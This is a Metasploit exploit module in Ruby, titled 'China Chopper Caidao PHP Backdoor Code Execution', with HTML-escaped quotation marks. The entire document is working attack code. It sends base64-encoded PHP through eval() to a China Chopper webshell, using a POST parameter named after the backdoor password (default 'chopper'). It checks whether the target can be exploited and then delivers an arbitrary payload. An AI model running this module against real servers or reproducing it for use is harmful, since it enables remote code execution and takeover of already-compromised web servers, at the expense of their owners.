# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;              => &#039;China Chopper Caidao PHP Backdoor Code Execution&#039;,
      &#039;Description&#039;       => %q{
        This module takes advantage of the China Chopper Webshell that is
        commonly used by Chinese hackers.
      },
      &#039;License&#039;           => MSF_LICENSE,
      &#039;Author&#039;            => [&#039;Nixawk&#039;],
      &#039;References&#039;        =>
        [
          [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html&#039;],
          [&#039;URL&#039;, &#039;https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html&#039;]
        ],
      &#039;Platform&#039;          => [&#039;php&#039;],
      &#039;Arch&#039;              => ARCH_PHP,
      &#039;Targets&#039;           =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;Privileged&#039;        => false,
      &#039;DisclosureDate&#039;    => &#039;Oct 27 2015&#039;,
      &#039;DefaultTarget&#039;     => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path of backdoor&#039;, &#039;/caidao.php&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password of backdoor&#039;, &#039;chopper&#039;])
      ], self.class)
  end

  def http_send_command(code)
    code = "eval(base64_decode(\"#{Rex::Text.encode_base64(code)}\"));"
    send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path),
      &#039;vars_post&#039; => {
        "#{datastore[&#039;PASSWORD&#039;]}" => code
      }
    })
  end

  def check
    flag = Rex::Text.rand_text_alpha(16)
    res = http_send_command("printf(\"#{flag}\");")
    if res && res.body =~ /#{flag}/m
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status("#{peer} - Sending exploit...")
    http_send_command(payload.raw)
  end
end

